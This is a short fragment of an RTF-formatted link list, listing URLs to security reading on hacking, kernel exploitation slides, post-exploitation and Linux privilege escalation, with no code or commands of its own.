\par\plain {\f0\fs24\b0\i0 http://www.microloft.co.uk/hacking/hacking3.htm}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Misc}
\par\plain {\f0\fs24\b0\i0 http://jon.oberheide.org/files/stackjacking-infiltrate11.pdf}
\par\plain {\f0\fs24\b0\i0 http://pentest.cryptocity.net/files/clientsides/post_exploitation_fall09.pdf}
\par\plain {\f0\fs24\b0\i0 http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html}}